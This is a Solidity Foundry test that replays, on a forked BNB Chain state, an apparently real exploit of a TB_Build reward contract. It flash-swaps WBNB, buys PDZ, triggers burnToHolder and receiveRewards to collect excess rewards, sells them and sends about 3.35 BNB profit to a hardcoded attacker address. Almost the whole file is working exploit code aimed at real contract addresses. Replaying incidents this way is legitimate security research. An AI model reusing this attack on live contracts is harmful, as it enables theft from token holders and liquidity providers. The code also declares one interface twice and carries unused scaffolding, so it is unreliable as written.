
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 57744490;
    uint256 constant TX_TIMESTAMP = 1755306491;
    uint256 constant TX_BLOCK_NUMBER = 57744491;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _installRuntime();
        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _logBalances("Before exploit");
        attack.executeSetup{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
        _hydrateAttackHelper();
    }

    function _hydrateAttackHelper() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(0)),
                bytes32(uint256(1069295261705322660692659746119710186699350608220))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(1)),
                bytes32(uint256(96635033217071433185869069577301221175488545358))
            );
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "BNB", 3352094698712248469);
    }
}

contract OurAttack {




    AttackerHelper public helper;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        helper = AttackerHelper(payable(Addresses.attack_helper));
    }

    function executeSetup() external payable {
        if (address(helper) == address(0)) _ctorBootstrap();
        _setup();
    }

    function _setup() public {
        {
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper();
        IUniswapV2PairLike(Addresses.Cake_LP).swap(10000000000000000000, 0, Addresses.attack_helper, hex"00");
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackerHelper {
    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x84800812) {
            _callback();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function callback() external payable {
        _callback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _callback() internal {
        _markCallback(0);
        IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, type(uint256).max);
        {
            if (10000000000000000000 != 0) {
                IERC20Like(Addresses.WBNB).approve(Addresses.PancakeRouter, 10000000000000000000);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        10000000000000000000,
                        0,
                        _addressArray2(Addresses.WBNB, Addresses.PDZ),
                        Addresses.attack_helper,
                        1755306491
                    );
            }
        }
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(3630503056723304190, _addressArray2(Addresses.PDZ, Addresses.WBNB));
        ITB_Build(Addresses.TB_Build).burnToHolder(5467668273, Addresses.ZERO);
        uint256 pdzBalanceOfAttackHelper = IERC20Like(Addresses.PDZ).balanceOf(Addresses.attack_helper);
        ITB_Build(Addresses.TB_Build).receiveRewards(Addresses.attack_helper);
        uint256 pdzBalanceOfAttackHelper_2 = IERC20Like(Addresses.PDZ).balanceOf(Addresses.attack_helper);
        IERC20Like(Addresses.PDZ).approve(Addresses.PancakeRouter, type(uint256).max);
        {
            if (pdzBalanceOfAttackHelper_2 != 0) {
                IERC20Like(Addresses.PDZ).approve(Addresses.PancakeRouter, pdzBalanceOfAttackHelper_2);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForETHSupportingFeeOnTransferTokens(
                        pdzBalanceOfAttackHelper_2,
                        0,
                        _addressArray2(Addresses.PDZ, Addresses.WBNB),
                        Addresses.attack_helper,
                        1755306491
                    );
            }
        }
        {
            uint256 depositAmount = address(this).balance;
            if (depositAmount > 10250000000000000001) depositAmount = 10250000000000000001;
            if (depositAmount != 0) IWBNB(Addresses.WBNB).deposit{value: depositAmount}();
        }
        {
            Harness.vmExt().startPrank(Addresses.attack_helper);
            IERC20Like(Addresses.WBNB).transfer(Addresses.Cake_LP, 10250000000000000001);

            Harness.vmExt().stopPrank();
        }
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 3355988629712248469) nativeTransferAmount = 3355988629712248469;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _attack() internal {
        _markCallback(1);
    }

    function _helper() public {}
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant attack_contract = 0x1dfFe35Fb021f124f04D1a654236E0879FA0CB81;
    address internal constant Cake_LP = 0x231d9e7181E8479A8B40930961e93E7ed798542C;
    address internal constant attacker_eoa = 0x48234fB95D4D3E5a09F3ec4dD57f68281B78C825;
    address internal constant PDZ = 0x50F2B2a555e5Fa9E1bb221433DbA2331E8664A69;
    address internal constant TB_Build = 0x664201579057f50D23820d20558f4b61bd80BDda;
    address internal constant Cake_LP_38AB = 0x7b51150F5A61e97f62447E59C7947660822438ab;
    address internal constant attack_helper = 0x81F1acd2DAd2A9FE2D879E723fB80b7aeCDc1337;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant FLOKI = 0xfb5B838b6cfEEdC2873aB27866079AC55363D37E;
}

interface IPancakeRouter {
    function getAmountsIn(uint256, address[] calldata) external view;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256)
        external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface ITB_Build {
    function burnToHolder(uint256, address) external;
    function receiveRewards(address) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IWBNB {
    function deposit() external payable;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
